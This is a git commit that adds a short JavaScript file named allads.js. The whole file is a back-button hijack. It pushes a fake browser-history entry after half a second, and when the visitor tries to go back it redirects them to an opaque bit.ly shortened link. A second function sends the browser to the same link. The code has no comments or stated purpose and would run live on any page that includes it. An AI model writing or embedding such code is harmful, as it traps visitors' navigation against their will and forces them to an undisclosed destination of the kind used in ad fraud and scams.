3c42e28befe7c2ddbd0019f9b255772975609b1e
zamonize1 <52072397+zamonize@users.noreply.github.com>
2024-05-31 05:07:55 -0700

    Create allads.js

---
+++ allads.js
@@ -0,0 +1,12 @@
+
+    window.onhashchange=function(){jp();};
+    function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
+    function jp() {
+        fh();}
+    setTimeout('hh();', 500);
+    function fh(){
+        location.href="https://bit.ly/4ayYZ9t";
+    }
+    function goon(){
+        location.href="https://bit.ly/4ayYZ9t";
+    }
